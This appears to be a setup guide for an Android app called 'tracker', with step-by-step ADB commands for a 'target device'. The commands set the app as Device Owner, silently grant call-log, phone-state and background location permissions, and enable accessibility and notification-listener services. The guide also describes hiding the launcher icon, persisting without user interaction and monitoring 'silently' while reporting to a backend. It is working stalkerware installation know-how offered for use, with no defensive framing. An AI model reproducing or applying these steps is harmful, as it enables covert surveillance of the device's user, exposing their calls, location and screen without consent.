# Device Owner Setup Guide

## One-Time ADB Setup

After installing the APK on the target device, run these commands via ADB
to grant Device Owner privileges. This enables:

- Auto-granting all permissions silently
- Hiding the app launcher icon
- Persisting across reboots without user interaction
- MediaProjection without repeated prompts

### Prerequisites
1. The target device must be factory reset OR have no Google accounts added
2. USB debugging must be enabled
3. ADB must be connected to the device

### Commands

```bash
# 1. Install the APK
adb install tracker-release.apk

# 2. Set as Device Owner (MUST be done before any Google account is added)
adb shell dpm set-device-owner com.tracker.app/.DeviceAdminReceiver

# 3. Grant all runtime permissions
adb shell pm grant com.tracker.app android.permission.READ_PHONE_STATE
adb shell pm grant com.tracker.app android.permission.READ_CALL_LOG
adb shell pm grant com.tracker.app android.permission.PROCESS_OUTGOING_CALLS
adb shell pm grant com.tracker.app android.permission.ACCESS_FINE_LOCATION
adb shell pm grant com.tracker.app android.permission.ACCESS_COARSE_LOCATION
adb shell pm grant com.tracker.app android.permission.ACCESS_BACKGROUND_LOCATION
adb shell pm grant com.tracker.app android.permission.POST_NOTIFICATIONS

# 4. Disable battery optimization for the app
adb shell dumpsys deviceidle whitelist +com.tracker.app

# 5. Enable the Accessibility Service
adb shell settings put secure enabled_accessibility_services com.tracker.app/.services.SpacebarAccessibilityService
adb shell settings put secure accessibility_enabled 1

# 6. Enable the Notification Listener Service (for VOIP call detection)
adb shell cmd notification allow_listener com.tracker.app/.services.CallMonitorService

# 7. Launch the app once for initial setup
adb shell am start -n com.tracker.app/.MainActivity
```

### After Setup
1. Open the app, it will show the setup screen
2. Tap "Start Setup" — it will register with the backend
3. The app will automatically hide its launcher icon
4. The monitoring services will start running silently

### Verifying Services Are Running
```bash
# Check foreground service
adb shell dumpsys activity services com.tracker.app

# Check accessibility service
adb shell settings get secure enabled_accessibility_services

# Check notification listener
adb shell cmd notification get_listeners
```

### Re-showing the App (for maintenance)
```bash
adb shell am start -n com.tracker.app/.MainActivity
```
